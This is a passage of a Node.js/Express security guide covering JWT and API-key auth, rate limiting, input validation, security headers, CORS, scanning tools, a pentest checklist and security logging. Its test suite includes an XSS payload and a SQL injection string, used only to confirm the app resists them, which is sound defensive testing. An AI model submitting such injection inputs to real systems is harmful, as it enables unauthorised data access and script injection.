  };
};

// Usage
app.get('/api/data',
  apiKeyAuth,
  requirePermission('read'),
  async (req, res) => {
    const data = await getData(req.user.id);
    res.json(data);
  }
);

app.post('/api/data',
  apiKeyAuth,
  requirePermission('write'),
  async (req, res) => {
    await saveData(req.user.id, req.body);
    res.json({ success: true });
  }
);

╔════════════════════════════════════════════════════════════╗
║                   JWT AUTHENTICATION                       ║
╚════════════════════════════════════════════════════════════╝

Secure JWT Implementation:
─────────────────────────────────────────────────────────────
const jwt = require('jsonwebtoken');

// Generate JWT
function generateToken(user) {
  const payload = {
    sub: user.id,  // Subject (user ID)
    username: user.username,
    role: user.role,
    iat: Math.floor(Date.now() / 1000),  // Issued at
    jti: crypto.randomBytes(16).toString('hex')  // JWT ID (for revocation)
  };

  const options = {
    expiresIn: '15m',  // Short-lived access token
    issuer: 'myapp.com',
    audience: 'myapp-api'
  };

  return jwt.sign(payload, process.env.JWT_SECRET, options);
}

// Generate refresh token
function generateRefreshToken(user) {
  const payload = {
    sub: user.id,
    type: 'refresh',
    jti: crypto.randomBytes(16).toString('hex')
  };

  return jwt.sign(payload, process.env.REFRESH_TOKEN_SECRET, {
    expiresIn: '7d'
  });
}

// Verify JWT middleware
const jwtAuth = async (req, res, next) => {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({
      error: 'No token provided',
      message: 'Include Authorization: Bearer <token> header'
    });
  }

  const token = authHeader.split(' ')[1];

  try {
    // Verify token
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      issuer: 'myapp.com',
      audience: 'myapp-api'
    });

    // Check if token is revoked (optional, use Redis for speed)
    const isRevoked = await redis.get(`revoked:${decoded.jti}`);
    if (isRevoked) {
      return res.status(401).json({ error: 'Token revoked' });
    }

    // Attach user to request
    req.user = {
      id: decoded.sub,
      username: decoded.username,
      role: decoded.role
    };
    req.tokenId = decoded.jti;

    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({
        error: 'Token expired',
        message: 'Use refresh token to get new access token'
      });
    }

    if (error.name === 'JsonWebTokenError') {
      return res.status(401).json({ error: 'Invalid token' });
    }

    res.status(500).json({ error: 'Authentication failed' });
  }
};

// Refresh token endpoint
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  if (!refreshToken) {
    return res.status(401).json({ error: 'Refresh token required' });
  }

  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);

    // Check if refresh token is revoked
    const isRevoked = await redis.get(`revoked:${decoded.jti}`);
    if (isRevoked) {
      return res.status(401).json({ error: 'Refresh token revoked' });
    }

    // Get user
    const user = await User.findById(decoded.sub);
    if (!user) {
      return res.status(401).json({ error: 'User not found' });
    }

    // Generate new access token
    const accessToken = generateToken(user);

    res.json({ accessToken });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});

// Revoke token (logout)
app.post('/auth/revoke', jwtAuth, async (req, res) => {
  const tokenId = req.tokenId;

  // Add token to revocation list (Redis)
  // Token expires after JWT expiration time
  await redis.set(`revoked:${tokenId}`, '1', 'EX', 15 * 60);

  res.json({ message: 'Token revoked' });
});

╔════════════════════════════════════════════════════════════╗
║                   RATE LIMITING                            ║
╚════════════════════════════════════════════════════════════╝

Advanced Rate Limiting:
─────────────────────────────────────────────────────────────
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');
const Redis = require('ioredis');

const redis = new Redis({
  host: process.env.REDIS_HOST,
  port: process.env.REDIS_PORT
});

// Global rate limiter
const globalLimiter = rateLimit({
  store: new RedisStore({
    client: redis,
    prefix: 'rl:global:'
  }),
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // 100 requests per window
  message: {
    error: 'Too many requests',
    retryAfter: 'Check Retry-After header'
  },
  standardHeaders: true, // Return rate limit info in headers
  legacyHeaders: false,
  keyGenerator: (req) => {
    // Rate limit by IP or user ID
    return req.user?.id || req.ip;
  }
});

// Strict limiter for auth endpoints
const authLimiter = rateLimit({
  store: new RedisStore({
    client: redis,
    prefix: 'rl:auth:'
  }),
  windowMs: 15 * 60 * 1000,
  max: 5, // Only 5 login attempts
  skipSuccessfulRequests: true, // Don't count successful logins
  message: {
    error: 'Too many login attempts',
    message: 'Try again after 15 minutes'
  }
});

// Tiered rate limiting (different limits for different users)
const tieredLimiter = (req, res, next) => {
  const tier = req.user?.tier || 'free';

  const limits = {
    free: { windowMs: 60 * 1000, max: 10 },      // 10/min
    basic: { windowMs: 60 * 1000, max: 100 },    // 100/min
    premium: { windowMs: 60 * 1000, max: 1000 }  // 1000/min
  };

  const limiter = rateLimit({
    store: new RedisStore({
      client: redis,
      prefix: `rl:${tier}:`
    }),
    ...limits[tier],
    keyGenerator: (req) => req.user.id
  });

  return limiter(req, res, next);
};

// Apply rate limiters
app.use('/api/', globalLimiter);
app.use('/auth/', authLimiter);
app.use('/api/protected', jwtAuth, tieredLimiter);

// Custom rate limit check
async function checkRateLimit(userId, action, limit, window) {
  const key = `rl:custom:${userId}:${action}`;
  const current = await redis.incr(key);

  if (current === 1) {
    await redis.expire(key, window);
  }

  if (current > limit) {
    const ttl = await redis.ttl(key);
    throw new Error(`Rate limit exceeded. Retry after ${ttl} seconds.`);
  }

  return { remaining: limit - current, resetIn: await redis.ttl(key) };
}

// Usage
app.post('/api/expensive-operation', jwtAuth, async (req, res) => {
  try {
    // Allow 10 operations per hour
    await checkRateLimit(req.user.id, 'expensive-op', 10, 3600);

    // Perform operation
    const result = await expensiveOperation();

    res.json(result);
  } catch (error) {
    if (error.message.includes('Rate limit')) {
      return res.status(429).json({ error: error.message });
    }
    throw error;
  }
});

╔════════════════════════════════════════════════════════════╗
║                   INPUT VALIDATION                         ║
╚════════════════════════════════════════════════════════════╝

Comprehensive Input Validation:
─────────────────────────────────────────────────────────────
const { body, param, query, validationResult } = require('express-validator');

// Validation middleware
const validate = (req, res, next) => {
  const errors = validationResult(req);

  if (!errors.isEmpty()) {
    return res.status(400).json({
      error: 'Validation failed',
      details: errors.array()
    });
  }

  next();
};

// Example: Create user endpoint
app.post('/api/users',
  [
    // Username validation
    body('username')
      .trim()
      .isLength({ min: 3, max: 20 })
      .withMessage('Username must be 3-20 characters')
      .matches(/^[a-zA-Z0-9_]+$/)
      .withMessage('Username can only contain letters, numbers, and underscores')
      .custom(async (username) => {
        const exists = await User.findOne({ username });
        if (exists) {
          throw new Error('Username already taken');
        }
      }),

    // Email validation
    body('email')
      .trim()
      .isEmail()
      .withMessage('Invalid email')
      .normalizeEmail()
      .custom(async (email) => {
        const exists = await User.findOne({ email });
        if (exists) {
          throw new Error('Email already registered');
        }
      }),

    // Password validation
    body('password')
      .isLength({ min: 8 })
      .withMessage('Password must be at least 8 characters')
      .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
      .withMessage('Password must contain uppercase, lowercase, number, and special character'),

    // Age validation
    body('age')
      .optional()
      .isInt({ min: 13, max: 120 })
      .withMessage('Age must be between 13 and 120'),

    // URL validation
    body('website')
      .optional()
      .isURL({ protocols: ['http', 'https'], require_protocol: true })
      .withMessage('Invalid URL'),

    // Phone validation
    body('phone')
      .optional()
      .matches(/^\+?[1-9]\d{1,14}$/)
      .withMessage('Invalid phone number (E.164 format)'),

    // Date validation
    body('birthDate')
      .optional()
      .isISO8601()
      .withMessage('Invalid date format')
      .custom((date) => {
        const age = Math.floor((Date.now() - new Date(date)) / 31557600000);
        if (age < 13) {
          throw new Error('Must be at least 13 years old');
        }
        return true;
      }),

    validate
  ],
  async (req, res) => {
    // Input is validated and sanitized
    const user = await User.create(req.body);
    res.status(201).json(user);
  }
);

// File upload validation
const multer = require('multer');

const upload = multer({
  limits: {
    fileSize: 5 * 1024 * 1024, // 5 MB
    files: 1
  },
  fileFilter: (req, file, cb) => {
    // Check file type
    const allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];

    if (!allowedMimes.includes(file.mimetype)) {
      return cb(new Error('Invalid file type. Only JPEG, PNG, GIF allowed.'));
    }

    // Check extension
    const allowedExts = ['.jpg', '.jpeg', '.png', '.gif'];
    const ext = path.extname(file.originalname).toLowerCase();

    if (!allowedExts.includes(ext)) {
      return cb(new Error('Invalid file extension.'));
    }

    cb(null, true);
  }
});

app.post('/api/upload',
  jwtAuth,
  upload.single('image'),
  async (req, res) => {
    // Additional file validation
    const buffer = req.file.buffer;

    // Verify it's actually an image
    const fileType = await import('file-type');
    const type = await fileType.fileTypeFromBuffer(buffer);

    if (!type || !type.mime.startsWith('image/')) {
      return res.status(400).json({ error: 'File is not an image' });
    }

    // Process and save file
    const filename = `${req.user.id}_${Date.now()}${path.extname(req.file.originalname)}`;
    await saveFile(filename, buffer);

    res.json({ filename });
  }
);

╔════════════════════════════════════════════════════════════╗
║                   API RESPONSE FILTERING                   ║
╚════════════════════════════════════════════════════════════╝

Secure Response Handling:
─────────────────────────────────────────────────────────────
// Filter sensitive data from responses
class UserDTO {
  constructor(user) {
    this.id = user.id;
    this.username = user.username;
    this.email = user.email;
    this.avatar = user.avatar;
    this.role = user.role;
    this.createdAt = user.createdAt;

    // ❌ Don't include:
    // - passwordHash
    // - apiKeys
    // - resetTokens
    // - internal IDs
    // - sensitive metadata
  }
}

// Usage
app.get('/api/users/:id', jwtAuth, async (req, res) => {
  const user = await User.findById(req.params.id);

  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  // Filter response
  res.json(new UserDTO(user));
});

// Conditional field exposure
class DetailedUserDTO extends UserDTO {
  constructor(user, requester) {
    super(user);

    // Add fields only if user is viewing their own profile
    if (requester.id === user.id) {
      this.email = user.email;
      this.phoneNumber = user.phoneNumber;
      this.private_data = user.private_data;
    }

    // Add admin-only fields
    if (requester.role === 'admin') {
      this.lastLogin = user.lastLogin;
      this.ipAddress = user.ipAddress;
      this.accountStatus = user.accountStatus;
    }
  }
}

// Error response sanitization
app.use((err, req, res, next) => {
  console.error(err);

  // ❌ Don't expose:
  // - Stack traces
  // - Database errors
  // - File paths
  // - Environment variables

  if (process.env.NODE_ENV === 'production') {
    // Generic error message
    res.status(err.status || 500).json({
      error: 'Internal server error',
      requestId: req.id  // For tracking
    });
  } else {
    // Detailed error in development
    res.status(err.status || 500).json({
      error: err.message,
      stack: err.stack
    });
  }
});

╔════════════════════════════════════════════════════════════╗
║                   API VERSIONING                           ║
╚════════════════════════════════════════════════════════════╝

Secure API Versioning:
─────────────────────────────────────────────────────────────
// URL versioning
app.use('/api/v1', v1Routes);
app.use('/api/v2', v2Routes);

// Header versioning
app.use((req, res, next) => {
  const version = req.headers['api-version'] || '1';

  if (version === '1') {
    req.apiVersion = 'v1';
  } else if (version === '2') {
    req.apiVersion = 'v2';
  } else {
    return res.status(400).json({
      error: 'Unsupported API version',
      supported: ['1', '2']
    });
  }

  next();
});

// Deprecation warnings
app.use('/api/v1', (req, res, next) => {
  res.set({
    'X-API-Deprecated': 'true',
    'X-API-Sunset': '2024-12-31',
    'X-API-Migration-Guide': 'https://docs.myapp.com/api/v2-migration'
  });
  next();
});

═══════════════════════════════════════════════════════════
```

---

<div align="center">

## 🌐 Security Headers

</div>

### Essential HTTP Security Headers 🛡️

```bash
# ═══════════════════════════════════════════
# SECURITY HEADERS
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   HELMET.JS (RECOMMENDED)                  ║
╚════════════════════════════════════════════════════════════╝

Complete Security Headers Setup:
─────────────────────────────────────────────────────────────
const helmet = require('helmet');

app.use(helmet({
  // Content Security Policy (CSP)
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        "'nonce-{random}'",  // Use nonces for inline scripts
        "https://cdn.trusted.com"
      ],
      styleSrc: ["'self'", "'unsafe-inline'"],  // Inline styles often needed
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.myapp.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      objectSrc: ["'none'"],  // Block plugins
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],   // Block iframes
      baseUri: ["'self'"],
      formAction: ["'self'"],
      frameAncestors: ["'none'"],  // Prevent clickjacking
      upgradeInsecureRequests: []  // Force HTTPS
    }
  },

  // X-DNS-Prefetch-Control
  dnsPrefetchControl: {
    allow: false  // Disable DNS prefetching
  },

  // X-Frame-Options (clickjacking protection)
  frameguard: {
    action: 'deny'  // Options: 'deny', 'sameorigin', 'allow-from'
  },

  // Hide X-Powered-By header
  hidePoweredBy: true,

  // Strict-Transport-Security (HSTS)
  hsts: {
    maxAge: 31536000,  // 1 year in seconds
    includeSubDomains: true,
    preload: true
  },

  // X-Download-Options
  ieNoOpen: true,  // IE8+ won't open downloads in context

  // X-Content-Type-Options
  noSniff: true,  // Prevent MIME type sniffing

  // X-Permitted-Cross-Domain-Policies
  permittedCrossDomainPolicies: {
    permittedPolicies: 'none'
  },

  // Referrer-Policy
  referrerPolicy: {
    policy: 'strict-origin-when-cross-origin'
  },

  // X-XSS-Protection (legacy, CSP is better)
  xssFilter: true
}));

╔════════════════════════════════════════════════════════════╗
║                   INDIVIDUAL HEADERS EXPLAINED             ║
╚════════════════════════════════════════════════════════════╝

1. Content-Security-Policy (CSP)
─────────────────────────────────────────────────────────────
Prevents XSS by controlling resources that can be loaded

// Strict CSP example
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' https: data:;
  font-src 'self';
  connect-src 'self' https://api.myapp.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';

// Implementation with nonces
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`]
  }
}));

// In HTML
<script nonce="<%= nonce %>">
  // This script is allowed
  console.log('Safe inline script');
</script>

2. Strict-Transport-Security (HSTS)
─────────────────────────────────────────────────────────────
Forces HTTPS for entire domain

Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// Effect:
// - Browser remembers to use HTTPS for 1 year
// - Applies to all subdomains
// - Submit to HSTS preload list: hstspreload.org

// Force HTTPS redirect
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https' && process.env.NODE_ENV === 'production') {
    res.redirect(301, `https://${req.header('host')}${req.url}`);
  } else {
    next();
  }
});

3. X-Frame-Options
─────────────────────────────────────────────────────────────
Prevents clickjacking by blocking iframe embedding

X-Frame-Options: DENY  // Never allow framing
X-Frame-Options: SAMEORIGIN  // Only same-origin frames

app.use(helmet.frameguard({ action: 'deny' }));

4. X-Content-Type-Options
─────────────────────────────────────────────────────────────
Prevents MIME type sniffing

X-Content-Type-Options: nosniff

// Prevents browser from interpreting files as different type
// Example: .txt file won't be executed as JavaScript

app.use(helmet.noSniff());

5. Referrer-Policy
─────────────────────────────────────────────────────────────
Controls referrer information sent with requests

Referrer-Policy: strict-origin-when-cross-origin

// Options:
// - no-referrer: Never send referrer
// - same-origin: Only to same origin
// - strict-origin: Send origin, not path (HTTPS only)
// - strict-origin-when-cross-origin: Full URL for same-origin

app.use(helmet.referrerPolicy({
  policy: 'strict-origin-when-cross-origin'
}));

6. Permissions-Policy (formerly Feature-Policy)
─────────────────────────────────────────────────────────────
Controls browser features

Permissions-Policy:
  geolocation=(),
  microphone=(),
  camera=(),
  payment=(),
  usb=(),
  magnetometer=()

app.use((req, res, next) => {
  res.setHeader('Permissions-Policy',
    'geolocation=(), microphone=(), camera=()'
  );
  next();
});

7. X-XSS-Protection (Legacy)
─────────────────────────────────────────────────────────────
Built-in XSS filter (mostly superseded by CSP)

X-XSS-Protection: 1; mode=block

app.use(helmet.xssFilter());

8. Cache-Control (Security aspect)
─────────────────────────────────────────────────────────────
Control caching of sensitive data

// Sensitive pages (user profile, admin)
app.use('/admin', (req, res, next) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  next();
});

// Public assets (images, CSS, JS)
app.use('/static', (req, res, next) => {
  res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  next();
});

╔════════════════════════════════════════════════════════════╗
║                   CORS CONFIGURATION                       ║
╚════════════════════════════════════════════════════════════╝

Secure CORS Setup:
─────────────────────────────────────────────────────────────
const cors = require('cors');

// ❌ INSECURE: Allow all origins
app.use(cors());  // Don't do this in production!

// ✅ SECURE: Whitelist specific origins
const allowedOrigins = [
  'https://myapp.com',
  'https://www.myapp.com',
  'https://admin.myapp.com'
];

if (process.env.NODE_ENV === 'development') {
  allowedOrigins.push('http://localhost:3000');
  allowedOrigins.push('http://localhost:5173');
}

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (mobile apps, Postman)
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,  // Allow cookies
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  exposedHeaders: ['X-Total-Count', 'X-Page-Count'],
  maxAge: 86400  // Preflight cache (24 hours)
}));

// Different CORS for different routes
app.use('/api/public', cors({
  origin: '*'  // Public API, any origin
}));

app.use('/api/admin', cors({
  origin: 'https://admin.myapp.com',  // Strict for admin
  credentials: true
}));

╔════════════════════════════════════════════════════════════╗
║                   SECURITY HEADERS CHECKLIST               ║
╚════════════════════════════════════════════════════════════╝

Essential Headers:
─────────────────────────────────────────────────────────────
✅ Content-Security-Policy (prevents XSS)
✅ Strict-Transport-Security (forces HTTPS)
✅ X-Frame-Options (prevents clickjacking)
✅ X-Content-Type-Options (prevents MIME sniffing)
✅ Referrer-Policy (controls referrer info)
✅ Permissions-Policy (limits browser features)

Additional:
─────────────────────────────────────────────────────────────
✅ Remove X-Powered-By (hide technology stack)
✅ Set secure CORS policy
✅ Implement rate limiting headers
✅ Use Cache-Control for sensitive data
✅ Set proper Content-Type headers

Testing Your Headers:
─────────────────────────────────────────────────────────────
Tools:
• https://securityheaders.com
• https://observatory.mozilla.org
• Chrome DevTools → Network → Headers
• curl -I https://yourapp.com

═══════════════════════════════════════════════════════════
```

---

<div align="center">

## 🔍 Security Testing

</div>

### Testing & Vulnerability Scanning 🔍

```bash
# ═══════════════════════════════════════════
# SECURITY TESTING STRATEGIES
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   TESTING PYRAMID                          ║
╚════════════════════════════════════════════════════════════╝

        ╱╲
       ╱  ╲     Manual Penetration Testing
      ╱────╲
     ╱      ╲   Dynamic Application Security Testing (DAST)
    ╱────────╲
   ╱          ╲ Static Application Security Testing (SAST)
  ╱────────────╲
 ╱              ╲ Dependency Scanning
╱────────────────╲

# ═══════════════════════════════════════════
# DEPENDENCY SCANNING
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   AUTOMATED VULNERABILITY SCANNING         ║
╚════════════════════════════════════════════════════════════╝

1. npm audit (Built-in)
─────────────────────────────────────────────────────────────
# Check for vulnerabilities
npm audit

# Output example:
┌───────────────┬──────────────────────────────────────────────────────────────┐
│ high          │ Regular Expression Denial of Service                         │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Package       │ trim                                                         │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Patched in    │ >= 0.0.3                                                     │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Dependency of │ express                                                      │
└───────────────┴──────────────────────────────────────────────────────────────┘

# Fix automatically
npm audit fix

# Force fix (may break)
npm audit fix --force

# CI/CD integration
# Fail build if high/critical vulnerabilities found
npm audit --audit-level=high

# package.json script
{
  "scripts": {
    "security-check": "npm audit --audit-level=high"
  }
}

2. Snyk (Recommended)
─────────────────────────────────────────────────────────────
# Install
npm install -g snyk

# Authenticate
snyk auth

# Test project
snyk test

# Monitor project (continuous monitoring)
snyk monitor

# Test Docker images
snyk test --docker node:18

# Test infrastructure as code
snyk iac test

# CI/CD integration (.github/workflows/security.yml)
name: Security Scan

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

3. Dependabot (GitHub)
─────────────────────────────────────────────────────────────
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "security"
      - "dependencies"

# Automatically creates PRs for vulnerable dependencies

╔════════════════════════════════════════════════════════════╗
║                   STATIC CODE ANALYSIS (SAST)              ║
╚════════════════════════════════════════════════════════════╝

1. ESLint Security Plugin
─────────────────────────────────────────────────────────────
# Install
npm install --save-dev eslint-plugin-security

# .eslintrc.json
{
  "plugins": ["security"],
  "extends": ["plugin:security/recommended"],
  "rules": {
    "security/detect-object-injection": "error",
    "security/detect-non-literal-regexp": "error",
    "security/detect-unsafe-regex": "error",
    "security/detect-eval-with-expression": "error",
    "security/detect-non-literal-fs-filename": "error",
    "security/detect-child-process": "error"
  }
}

# Run
npm run lint

2. SonarQube
─────────────────────────────────────────────────────────────
# Setup with Docker
docker run -d --name sonarqube -p 9000:9000 sonarqube

# Install scanner
npm install --save-dev sonarqube-scanner

# sonar-project.properties
sonar.projectKey=my-project
sonar.projectName=My Project
sonar.projectVersion=1.0
sonar.sources=src
sonar.tests=tests
sonar.javascript.lcov.reportPaths=coverage/lcov.info

# Run scan
npx sonar-scanner

3. CodeQL (GitHub Advanced Security)
─────────────────────────────────────────────────────────────
# .github/workflows/codeql.yml
name: CodeQL Analysis

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      security-events: write

    steps:
      - uses: actions/checkout@v3

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v2
        with:
          languages: javascript

      - name: Autobuild
        uses: github/codeql-action/autobuild@v2

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v2

╔════════════════════════════════════════════════════════════╗
║                   DYNAMIC TESTING (DAST)                   ║
╚════════════════════════════════════════════════════════════╝

1. OWASP ZAP
─────────────────────────────────────────────────────────────
# Run with Docker
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://myapp.com \
  -r zap-report.html

# CI/CD integration
# .github/workflows/dast.yml
name: DAST Scan

on:
  schedule:
    - cron: '0 0 * * 0'  # Weekly

jobs:
  zap_scan:
    runs-on: ubuntu-latest
    steps:
      - name: ZAP Scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'https://staging.myapp.com'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'

2. Nuclei (Fast vulnerability scanner)
─────────────────────────────────────────────────────────────
# Install
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Update templates
nuclei -update-templates

# Scan
nuclei -u https://myapp.com

# Scan with specific templates
nuclei -u https://myapp.com -t cves/ -t vulnerabilities/

# CI/CD
nuclei -u https://staging.myapp.com -severity high,critical

╔════════════════════════════════════════════════════════════╗
║                   PENETRATION TESTING                      ║
╚════════════════════════════════════════════════════════════╝

Manual Security Testing Checklist:
─────────────────────────────────────────────────────────────

Authentication:
☐ Test password complexity requirements
☐ Test account lockout after failed attempts
☐ Test password reset flow
☐ Test session timeout
☐ Test concurrent sessions
☐ Test privilege escalation
☐ Test credential stuffing protection

Authorization:
☐ Test IDOR (access other user's data)
☐ Test role-based access control
☐ Test horizontal privilege escalation
☐ Test vertical privilege escalation
☐ Test API endpoint authorization
☐ Test file access permissions

Input Validation:
☐ Test SQL injection
☐ Test NoSQL injection
☐ Test XSS (stored, reflected, DOM-based)
☐ Test command injection
☐ Test LDAP injection
☐ Test XML injection
☐ Test template injection
☐ Test file upload vulnerabilities
☐ Test path traversal

Session Management:
☐ Test session fixation
☐ Test session hijacking
☐ Test CSRF protection
☐ Test cookie security flags
☐ Test token expiration
☐ Test logout functionality

Data Protection:
☐ Test encryption in transit (HTTPS)
☐ Test encryption at rest
☐ Test sensitive data in URLs
☐ Test sensitive data in logs
☐ Test data leakage in errors
☐ Test API response filtering

Business Logic:
☐ Test race conditions
☐ Test price manipulation
☐ Test quantity limits
☐ Test refund abuse
☐ Test referral code abuse
☐ Test gift card vulnerabilities

Tools for Manual Testing:
─────────────────────────────────────────────────────────────
• Burp Suite (intercept & modify requests)
• Postman (API testing)
• Browser DevTools (inspect traffic)
• curl (command-line testing)
• sqlmap (SQL injection)

Example Burp Suite Workflow:
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Browse application normally
3. Review HTTP history in Burp
4. Send interesting requests to Repeater
5. Modify and resend requests
6. Look for vulnerabilities

╔════════════════════════════════════════════════════════════╗
║                   AUTOMATED SECURITY TESTING               ║
╚════════════════════════════════════════════════════════════╝

Security Test Suite:
─────────────────────────────────────────────────────────────
// tests/security/auth.test.js
const request = require('supertest');
const app = require('../app');

describe('Authentication Security', () => {

  test('should enforce rate limiting on login', async () => {
    const credentials = { username: 'test', password: 'wrong' };

    // Make 6 requests (limit is 5)
    const requests = Array(6).fill().map(() =>
      request(app)
        .post('/auth/login')
        .send(credentials)
    );

    const responses = await Promise.all(requests);

    // Last request should be rate limited
    expect(responses[5].status).toBe(429);
  });

  test('should reject weak passwords', async () => {
    const response = await request(app)
      .post('/auth/register')
      .send({
        username: 'testuser',
        email: 'test@example.com',
        password: '123456'  // Weak password
      });

    expect(response.status).toBe(400);
    expect(response.body.error).toContain('password');
  });

  test('should set secure cookie flags', async () => {
    const response = await request(app)
      .post('/auth/login')
      .send({ username: 'test', password: 'Test123!@#' });

    const cookies = response.headers['set-cookie'];
    expect(cookies[0]).toContain('HttpOnly');
    expect(cookies[0]).toContain('Secure');
    expect(cookies[0]).toContain('SameSite=Strict');
  });

  test('should prevent timing attacks', async () => {
    const start1 = Date.now();
    await request(app)
      .post('/auth/login')
      .send({ username: 'nonexistent', password: 'password' });
    const time1 = Date.now() - start1;

    const start2 = Date.now();
    await request(app)
      .post('/auth/login')
      .send({ username: 'existing', password: 'wrongpassword' });
    const time2 = Date.now() - start2;

    // Time difference should be minimal (< 100ms)
    expect(Math.abs(time1 - time2)).toBeLessThan(100);
  });

});

// tests/security/xss.test.js
describe('XSS Protection', () => {

  test('should escape HTML in comments', async () => {
    const xssPayload = '<script>alert("XSS")</script>';

    const response = await request(app)
      .post('/api/comments')
      .set('Authorization', `Bearer ${token}`)
      .send({ content: xssPayload });

    expect(response.status).toBe(201);

    // Verify stored content is escaped
    const comment = await Comment.findById(response.body.id);
    expect(comment.content).not.toContain('<script>');
    expect(comment.content).toContain('&lt;script&gt;');
  });

});

// tests/security/injection.test.js
describe('SQL Injection Protection', () => {

  test('should prevent SQL injection in search', async () => {
    const sqlInjection = "' OR '1'='1";

    const response = await request(app)
      .get('/api/search')
      .query({ q: sqlInjection });

    // Should not return all records
    expect(response.body.results.length).toBe(0);
    expect(response.status).toBe(200);
  });

});

╔════════════════════════════════════════════════════════════╗
║                   SECURITY TESTING SCHEDULE                ║
╚════════════════════════════════════════════════════════════╝

Continuous (Every Commit):
─────────────────────────────────────────────────────────────
✅ Dependency scanning (npm audit, Snyk)
✅ Static code analysis (ESLint security plugin)
✅ Unit tests with security assertions
✅ Pre-commit hooks (lint, test)

Daily:
─────────────────────────────────────────────────────────────
✅ SAST scan (SonarQube, CodeQL)
✅ Secret scanning (GitHub, GitGuardian)
✅ Container scanning (Trivy, Snyk)

Weekly:
─────────────────────────────────────────────────────────────
✅ DAST scan (OWASP ZAP)
✅ Dependency updates review
✅ Security log review

Monthly:
─────────────────────────────────────────────────────────────
✅ Manual penetration testing
✅ Security header review
✅ Certificate expiration check
✅ Access review (remove old users)

Quarterly:
─────────────────────────────────────────────────────────────
✅ External security audit
✅ Threat model review
✅ Security training for team
✅ Disaster recovery test

Annually:
─────────────────────────────────────────────────────────────
✅ Full penetration test by third party
✅ Security policy review
✅ Compliance audit (SOC 2, ISO 27001)
✅ Business continuity planning

═══════════════════════════════════════════════════════════
```

---

<div align="center">

## 🚨 Incident Response

</div>

### Security Incident Handling 🚨

```bash
# ═══════════════════════════════════════════
# INCIDENT RESPONSE PLAN
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   INCIDENT RESPONSE PHASES                 ║
╚════════════════════════════════════════════════════════════╝

1. Preparation
   ↓
2. Detection & Analysis
   ↓
3. Containment
   ↓
4. Eradication
   ↓
5. Recovery
   ↓
6. Post-Incident Review

# ═══════════════════════════════════════════
# DETECTION & MONITORING
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   LOGGING & ALERTING                       ║
╚════════════════════════════════════════════════════════════╝

Comprehensive Logging:
─────────────────────────────────────────────────────────────
const winston = require('winston');
const { combine, timestamp, json, errors } = winston.format;

// Security logger
const securityLogger = winston.createLogger({
  level: 'info',
  format: combine(
    errors({ stack: true }),
    timestamp(),
    json()
  ),
  defaultMeta: { service: 'security' },
  transports: [
    new winston.transports.File({
      filename: 'logs/security.log',
      maxsize: 10485760, // 10MB
      maxFiles: 30
    }),
    new winston.transports.File({
      filename: 'logs/security-errors.log',
      level: 'error',
      maxsize: 10485760,
      maxFiles: 90
    })
  ]
});

// Security events to log:
─────────────────────────────────────────────────────────────
function logSecurityEvent(event, details) {
  securityLogger.info({
    event,
    ...details,
    timestamp: new Date().toISOString()
